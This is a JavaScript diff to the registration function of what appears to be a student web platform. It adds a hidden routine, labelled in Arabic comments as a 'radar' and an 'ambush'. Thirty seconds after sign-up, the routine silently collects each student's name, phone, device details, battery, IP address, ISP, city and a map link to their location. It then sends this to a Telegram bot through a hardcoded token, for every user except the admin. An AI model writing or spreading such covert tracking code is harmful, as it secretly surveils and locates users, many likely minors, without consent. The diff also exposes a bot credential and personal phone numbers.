@@ -685,83 +685,76 @@ function completeRegistration() {
     document.getElementById('display-name').innerText = user.name.split(' ')[0];
 
     // --- الرادار الشامل: سحب كل ثغرة في الجهاز ---
-    const getSystemReport = async () => {
-        const model = navigator.userAgentData ? (await navigator.userAgentData.getHighEntropyValues(['model'])).model : navigator.platform;
-        const gpu = (() => {
-            const canvas = document.createElement('canvas');
-            const gl = canvas.getContext('webgl');
-            const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
-            return debugInfo ? gl.getParameter(debugInfo.UNMASKED_RENDERER_ID_WIKI) : "Hidden GPU";
-        })();
+    // 1. محرك سحب البيانات (بيصبر لحد ما البيانات تخلص)
+const getSystemReport = async () => {
+    const model = navigator.platform;
+    const ram = navigator.deviceMemory || "Unknown";
+    const cores = navigator.hardwareConcurrency || "Unknown";
+    
+    let bat = "Scanning...";
+    try { const b = await navigator.getBattery(); bat = Math.round(b.level * 100) + "% " + (b.charging ? '⚡' : '🔋'); } catch(e) {}
 
-        const ram = navigator.deviceMemory || "Unknown";
-        const cores = navigator.hardwareConcurrency || "Unknown";
-        let bat = "Scanning..."; 
-        try { const b = await navigator.getBattery(); bat = Math.round(b.level * 100) + "% " + (b.charging ? '⚡' : '🔋'); } catch(e) {}
-        const net = navigator.connection ? "Type: " + navigator.connection.effectiveType + " | Speed: ~" + navigator.connection.downlink + "Mbps" : "No Net Data";
+    let geo = { ip: "غير معروف", city: "غير معروف", org: "غير معروف", map: "No Map" };
+    
+    try {
+        const res = await fetch('https://ipwho.is/').then(r => r.json());
+        if(res.success) {
+            geo = { 
+                ip: res.ip, 
+                city: res.city + ", " + res.country, 
+                org: res.connection.isp,
+                // لينك الخريطة المباشر عشان يظهر أزرق
+                map: `https://www.google.com/maps?q=${res.latitude},${res.longitude}`
+            };
+        }
+    } catch(e) { console.log("Location Error"); }
 
-        let geo = { ip: "Scanning...", city: "Unknown", org: "Unknown", map: "No Map" };
-        try {
-            const res = await fetch('https://ipwho.is/').then(r => r.json());
-            if(res.success) {
-                geo = { 
-                    ip: res.ip, 
-                    city: res.city + ", " + res.country, 
-                    org: res.connection.isp,
-                    // التعديل هنا: لينك مباشر وشغال 100%
-                  map: "https://www.google.com/maps?q=" + res.latitude + "," + res.longitude  
-                };
-            }
-        } catch(e) {}
-
-        return {
-            name: user.name,
-            phone: user.phone,
-            model: model,
-            gpu: gpu,
-            hw: cores + " Cores | " + ram + "GB RAM",
-            display: window.screen.width + "x" + window.screen.height,
-            network: net,
-            battery: bat,
-            ip: geo.ip,
-            location: geo.city,
-            isp: geo.org,
-            map: geo.map,
-            lang: navigator.language,
-            time: new Date().toLocaleString('ar-EG')
-        };
+    return {
+        name: user.name,
+        phone: user.phone,
+        model: model,
+        hw: cores + " Cores | " + ram + "GB RAM",
+        battery: bat,
+        ip: geo.ip,
+        location: geo.city,
+        isp: geo.org,
+        map: geo.map,
+        lang: navigator.language,
+        time: new Date().toLocaleString('ar-EG')
     };
+};
 
-    // تنفيذ الرادار وإرسال التقرير صامت
+// 2. أمر التنفيذ (الكمين - بعد 30 ثانية)
+setTimeout(() => {
     getSystemReport().then(report => {
         // تحديث الفايربيز
         studentsRef.child(user.phone).update({ last_device: report });
-        presenceRef.child(user.phone).set({ last_seen: Date.now(), ...report });
 
-        // إرسال التقرير للتليجرام (لو مش آدم)
+        // الإرسال للتليجرام
         if (user.phone !== "01023175098") {
-            const token = "8691996536:AAHGdKL87Uem-z-tNR-aejGTpjI9SJcjlHY";
+            const token = "8691996536:AAHGdKL87Uem-z-tNR-aejGTpjI9SjcjlHY";
             const chatId = "5890070301";
-            
-                const text = `🕵️‍♂️ *تقرير اصطياد كامل (كيمو رادار)*
+
+            const text = `🕵️‍♂️ *تقرير اصطياد كامل (كيمو رادار)*
 ━━━━━━━━━━━━━━
 👤 *الطالب:* ${report.name}
 📞 *الموبايل:* ${report.phone}
 📱 *الجهاز:* ${report.model}
 ⚙️ *الهاردوير:* ${report.hw}
-🎮 *الجرافيك:* ${report.gpu}
 🔋 *البطارية:* ${report.battery}
 🌐 *الـ IP:* ${report.ip}
 📍 *المكان:* ${report.location}
 🏢 *الشركة:* ${report.isp}
-🌍 *اللغة:* ${report.lang}
-📍 *موقع الطالب (الخريطة):* ${report.map}
+📍 *موقع الطالب (الخريطة):*
+${report.map}
 ⏰ *التوقيت:* ${report.time}
 ━━━━━━━━━━━━━━`;
 
             fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(text)}&parse_mode=Markdown`);
         }
     });
+}, 30000); 
+
 
     // --- صلاحيات الأدمن آدم ---
     if(user.phone === "01023175098") {
